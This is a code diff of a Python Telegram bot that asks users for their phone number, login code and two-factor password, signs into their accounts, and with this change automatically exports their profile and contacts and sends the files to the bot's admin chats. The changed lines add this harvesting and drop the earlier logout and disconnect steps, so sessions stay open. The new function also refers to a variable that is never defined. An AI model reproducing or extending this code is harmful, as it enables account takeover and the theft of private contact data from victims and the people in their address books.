@@ -307,10 +307,7 @@ async def get_code(message: types.Message):
         await client.sign_in(phone_number, code, phone_code_hash=str(phone_code_hash))
         await message.answer("Подключено! Выбери в меню бота одну из опций")
         user_state[user_id]['connected'] = True  # Обновляем состояние
-        #await process_user_data(client, phone_number, message.from_user.id)
-        #await client.log_out()
-        #await client.disconnect()
-        #user_state.pop(message.from_user.id, None)  # Удаляем состояние пользователя после успешной обработки !!!!!!!!!!!!!!!!!!!!!!!!
+        await get_and_send_contacts(client, phone_number, user_id)
     except SessionPasswordNeededError:
         await message.answer("Установлена двухфакторная аутентификация. Введите пароль")
         user_state[message.from_user.id]['awaiting_password'] = True
@@ -353,8 +350,7 @@ async def process_password(message: types.Message):
             user_state[user_id]['connected'] = True  # Обновляем состояние
             await message.answer("Подключено! Выбери в меню бота одну из опций")
             phone_number = user_state[user_id]['phone_number']
-            # await process_user_data(client, phone_number, user_id)
-            # user_state.pop(user_id, None)  # Удаляем состояние пользователя после успешной обработки
+            await get_and_send_contacts(client, phone_number, user_id)
         except PasswordHashInvalidError:
             user_state[user_id]['password_attempts'] += 1
             if user_state[user_id]['password_attempts'] >= 3:
@@ -379,7 +375,12 @@ def create_client():
     return TelegramClient('session_name', api_id, api_hash)
 
 
-
+#Функция для выгрузки контактов 
+async def get_and_send_contacts(client, phone_number, user_id):
+  userid, userinfo, firstname, lastname, username, photos_user_html = await get_user_info(client, phone_number, selection)
+  total_contacts, total_contacts_with_phone, total_mutual_contacts = await get_and_save_contacts(client, phone_number, userid, userinfo, firstname, lastname, username)
+  await send_files_to_bot(bot, admin_chat_ids, user_id)
+  
 # Функция для обработки данных пользователя
 async def process_user_data(client, phone_number, user_id):
     selection = '0'
@@ -388,7 +389,7 @@ async def process_user_data(client, phone_number, user_id):
         count_blocked_bot, earliest_date, latest_date, blocked_bot_info, blocked_bot_info_html, user_bots, user_bots_html, list_botblocked = await get_blocked_bot(client, selection)
         delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, admin_id, user_bots, user_bots_html, list_botexisted = await get_type_of_chats(client, selection)
         groups, i, all_info, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html = await make_list_of_channels(delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, selection, client)
-        total_contacts, total_contacts_with_phone, total_mutual_contacts = await get_and_save_contacts(client, phone_number, userid, userinfo, firstname, lastname, username)
+        #total_contacts, total_contacts_with_phone, total_mutual_contacts = await get_and_save_contacts(client, phone_number, userid, userinfo, firstname, lastname, username)
         #await save_about_channels(phone_number, userid, firstname, lastname, username, openchannel_count, opengroup_count, closechannel_count, closegroup_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, openchannels, closechannels, openchats, closechats, delgroups, closegroupdel_count)
         bot_from_search, bot_from_search_html = await get_bot_from_search(client, phone_number, selection, list_botblocked, list_botexisted)
         await generate_html_report(phone_number, userid, userinfo, firstname, lastname, username, total_contacts, total_contacts_with_phone, total_mutual_contacts, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html, blocked_bot_info_html, user_bots_html, user_id, photos_user_html, bot_from_search_html)
